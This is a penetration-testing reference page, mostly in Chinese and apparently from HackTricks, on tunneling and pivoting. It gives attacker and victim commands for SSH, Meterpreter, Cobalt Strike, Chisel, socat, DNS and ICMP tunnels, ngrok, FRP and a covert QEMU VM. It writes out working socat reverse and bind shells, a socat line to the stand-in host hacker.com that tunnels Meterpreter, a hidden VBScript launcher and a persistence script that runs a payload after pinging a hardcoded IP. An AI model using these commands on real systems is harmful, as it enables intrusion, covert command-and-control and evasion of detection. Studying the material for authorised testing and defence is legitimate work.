# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> **ICMP** 和 **SYN** 扫描无法通过 socks 代理进行隧道传输，因此我们必须 **禁用 ping 发现** (`-Pn`) 并指定 **TCP 扫描** (`-sT`) 以使其工作。

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH 图形连接 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

在SSH服务器中打开新端口 --> 其他端口
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

本地端口 --> 被攻陷的主机 (SSH) --> 第三方主机:端口
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

本地端口 --> 被攻陷的主机 (SSH) --> 任何地方
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### 反向端口转发

这对于从内部主机通过DMZ获取反向shell到您的主机非常有用：
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

您需要**在两个设备上具有root权限**（因为您将创建新的接口），并且sshd配置必须允许root登录：\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
在服务器端启用转发
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
在客户端设置新路由
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **安全 – Terrapin 攻击 (CVE-2023-48795)**
> 2023年的Terrapin降级攻击可以让中间人篡改早期的SSH握手并将数据注入到**任何转发通道**（`-L`，`-R`，`-D`）。确保客户端和服务器都已打补丁（**OpenSSH ≥ 9.6/LibreSSH 6.7**），或者在依赖SSH隧道之前明确禁用易受攻击的`chacha20-poly1305@openssh.com`和`*-etm@openssh.com`算法，在`sshd_config`/`ssh_config`中进行设置。

## SSHUTTLE

您可以通过**ssh**将所有**流量**通过主机**隧道**到**子网络**。\
例如，转发所有流量到10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
使用私钥连接
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

本地端口 --> 被攻陷的主机（活动会话） --> 第三方主机:端口
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
另一种方法：
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS 代理

在 teamserver 中打开一个端口，监听所有接口，以便 **通过 beacon 路由流量**。
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 在这种情况下，**端口在信标主机上打开**，而不是在团队服务器上，流量被发送到团队服务器，然后从那里发送到指定的主机:端口
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
需要注意：

- Beacon 的反向端口转发旨在 **将流量隧道传输到 Team Server，而不是在单个机器之间中继**。
- 流量是 **在 Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
- **不需要管理员权限** 来在高端口上创建反向端口转发。

### rPort2Port 本地

> [!WARNING]
> 在这种情况下，**端口是在 beacon 主机上打开的**，而不是在 Team Server 上，**流量被发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的 host:port。
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

您需要上传一个网络文件隧道：ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

您可以从 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) 的发布页面下载它。\
您需要为客户端和服务器使用 **相同的版本**。

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### 端口转发
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**代理和代理使用相同的版本**

### 隧道传输
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### 代理绑定和监听
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### 访问代理的本地端口
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

反向隧道。隧道从受害者开始。\
在 127.0.0.1:1080 上创建一个 socks4 代理。
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
通过 **NTLM 代理** 进行枢转
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### 绑定 shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### 反向 shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### 通过socks进行Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### 通过 SSL Socat 的 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
您可以通过在受害者的控制台中执行这一行来绕过**非认证代理**，而不是最后一行：
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

在客户端和服务器两侧创建证书：
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

将本地 SSH 端口 (22) 连接到攻击者主机的 443 端口
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

它就像一个控制台版本的 PuTTY（选项与 ssh 客户端非常相似）。

由于这个二进制文件将在受害者的机器上执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便能够建立反向连接。然后，要将仅本地可访问的端口转发到我们机器上的一个端口：
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

您需要是本地管理员（对于任何端口）
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

您需要拥有 **系统的 RDP 访问权限**。\
下载：

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责 **在 RDP 连接上隧道数据包**。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

在您的客户端计算机上加载 **`SocksOverRDP-Plugin.dll`**，如下所示：
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP plugin is enabled**，并且它将 **listen** 在 **127.0.0.1:1080**。

通过 **RDP** 连接，并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
现在在你的机器（攻击者）上确认端口 1080 正在监听：
```
netstat -antb | findstr 1080
```
现在您可以使用 [**Proxifier**](https://www.proxifier.com/) **通过该端口代理流量。**

## 代理 Windows GUI 应用程序

您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理导航。\
在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 连接。

## NTLM 代理绕过

之前提到的工具：**Rpivot**\
**OpenVPN** 也可以绕过它，在配置文件中设置这些选项：
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

它对代理进行身份验证，并在本地绑定一个端口，该端口转发到您指定的外部服务。然后，您可以通过此端口使用您选择的工具。\
例如，转发端口 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
你也可以使用连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。

## YARP

由微软创建的反向代理。你可以在这里找到它: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

在两个系统中都需要root权限，以创建tun适配器并通过DNS查询在它们之间隧道数据。
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
隧道将非常慢。您可以通过使用以下命令创建一个压缩的SSH连接：
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**从这里下载**](https://github.com/iagox86/dnscat2)**.**

通过DNS建立C\&C通道。它不需要root权限。
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **在 PowerShell 中**

您可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 PowerShell 中运行 dnscat2 客户端：
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **使用 dnscat 进行端口转发**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### 更改 proxychains DNS

Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 **4.2.2.2**（硬编码）。要更改它，请编辑文件： _/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 **Windows 环境** 中，可以设置 **域控制器** 的 IP。

## Go 中的隧道

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP 隧道

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

在两个系统中都需要 root 权限，以创建 tun 适配器并使用 ICMP 回显请求在它们之间隧道数据。
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**从这里下载**](https://github.com/utoni/ptunnel-ng.git)。
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **是一个可以通过一条命令行将解决方案暴露到互联网的工具。**\
_暴露的 URI 类似于:_ **UID.ngrok.io**

### 安装

- 创建一个账户: https://ngrok.com/signup
- 客户端下载:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本用法

**文档:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_如果需要，也可以添加身份验证和 TLS。_

#### 隧道 TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### 通过HTTP暴露文件
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### 嗅探 HTTP 调用

_对 XSS, SSRF, SSTI ... 有用_\
直接从 stdout 或在 HTTP 接口 [http://127.0.0.1:4040](http://127.0.0.1:4000)。

#### 隧道内部 HTTP 服务
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 简单配置示例

它打开 3 个隧道：

- 2 个 TCP
- 1 个 HTTP，静态文件从 /tmp/httpbin/ 暴露
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare的 `cloudflared` 守护进程可以创建出站隧道，暴露 **本地 TCP/UDP 服务**，而无需入站防火墙规则，使用 Cloudflare 的边缘作为会合点。当出站防火墙仅允许 HTTPS 流量而入站连接被阻止时，这非常方便。

### 快速隧道一行命令
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 透传
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### 使用DNS的持久隧道
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
开始连接器：
```bash
cloudflared tunnel run mytunnel
```
因为所有流量都通过主机 **出站 443** 端口离开，Cloudflared 隧道是绕过入口 ACL 或 NAT 边界的简单方法。请注意，二进制文件通常以提升的权限运行 - 尽可能使用容器或 `--user` 标志。

## FRP (快速反向代理)

[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go 反向代理，支持 **TCP、UDP、HTTP/S、SOCKS 和 P2P NAT 穿透**。从 **v0.53.0 (2024年5月)** 开始，它可以充当 **SSH 隧道网关**，因此目标主机可以仅使用标准的 OpenSSH 客户端启动反向隧道 - 无需额外的二进制文件。

### 经典反向 TCP 隧道
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 使用新的 SSH 网关（无 frpc 二进制文件）
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上述命令将受害者的端口 **8080** 发布为 **attacker_ip:9000**，无需部署任何额外工具 – 非常适合利用现有资源进行转发。

## 使用 QEMU 的隐蔽 VM 基于隧道

QEMU 的用户模式网络 (`-netdev user`) 支持一个名为 `hostfwd` 的选项，该选项 **将 *主机* 上的 TCP/UDP 端口绑定并转发到 *客户机* 中**。当客户机运行完整的 SSH 守护进程时，hostfwd 规则为您提供一个一次性 SSH 跳转盒，完全存在于一个短暂的 VM 中 – 非常适合隐藏 C2 流量，因为所有恶意活动和文件都保留在虚拟磁盘中。

### 快速一行命令
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上面的命令在 RAM 中启动一个 **Tiny Core Linux** 镜像 (`tc.qcow2`)。  
• Windows 主机上的端口 **2222/tcp** 被透明地转发到来宾内部的 **22/tcp**。  
• 从攻击者的角度来看，目标仅仅暴露了端口 2222；到达该端口的任何数据包都由在虚拟机中运行的 SSH 服务器处理。  

### 通过 VBScript 隐秘启动
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
运行脚本 `cscript.exe //B update.vbs` 可以保持窗口隐藏。

### 客户端持久性

由于 Tiny Core 是无状态的，攻击者通常会：

1. 将有效载荷放置到 `/opt/123.out`
2. 追加到 `/opt/bootlocal.sh`：

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. 将 `home/tc` 和 `opt` 添加到 `/opt/filetool.lst`，以便在关机时将有效载荷打包到 `mydata.tgz` 中。

### 为什么这能逃避检测

• 只有两个未签名的可执行文件 (`qemu-system-*.exe`) 访问磁盘；没有安装驱动程序或服务。
• 主机上的安全产品看到的是 **良性的回环流量**（实际的 C2 在 VM 内部终止）。
• 内存扫描器从未分析恶意进程空间，因为它存在于不同的操作系统中。

### Defender 提示

• 对用户可写路径中的 **意外 QEMU/VirtualBox/KVM 二进制文件** 发出警报。
• 阻止来自 `qemu-system*.exe` 的出站连接。
• 寻找在 QEMU 启动后立即绑定的稀有监听端口（2222, 10022, …）。

---

## 其他检查工具

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## 参考文献

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)

{{#include ../banners/hacktricks-training.md}}
